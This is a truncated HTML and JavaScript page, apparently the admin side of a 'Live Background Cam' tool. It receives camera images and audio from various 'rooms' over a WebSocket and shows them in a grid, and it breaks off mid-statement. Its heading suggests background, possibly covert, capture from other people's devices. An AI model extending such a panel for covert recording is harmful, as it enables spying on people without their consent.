<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<title>Live Background Cam</title>
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<style>
body { margin:0; background:#000; color:#0f0; font-family:Arial; padding:20px; }
.grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:15px; }
.cam { border:2px solid #0f0; border-radius:12px; overflow:hidden; background:#111; position:relative; }
.cam img, .cam audio { width:100%; display:block; }
h2 { margin:0; padding:8px; background:#0f0; color:#000; font-size:14px; text-align:center; }
.status { color:#0f0; font-size:12px; text-align:center; padding:4px; position:absolute; bottom:0; left:0; right:0; background:rgba(0,0,0,0.7); }
.controls { margin-top:5px; text-align:center; }
.controls button { background:#0f0; color:#000; border:none; padding:5px 10px; cursor:pointer; border-radius:4px; font-size:12px; }
</style>
</head>
<body>
<h1>Camera + Audio in Background</h1>
<div id="grid" class="grid"></div>

<script>
const grid = document.getElementById('grid');
const protocol = location.protocol === 'https:' ? 'wss' : 'ws';
const ws = new WebSocket(`${protocol}://${location.host}/bg-admin`);
const rooms = new Map();
const imageCache = new Map();
let lastUpdate = Date.now();

ws.onopen = () => console.log('âœ… Admin connesso');
ws.onerror = e => console.error('WebSocket error:', e);
ws.onclose = () => console.warn('WebSocket chiuso');

ws.onmessage = e => {
  if (e.data instanceof Blob) {
    const currentRoom = localStorage.getItem('currentRoom');
    if (!currentRoom) return;
    const room
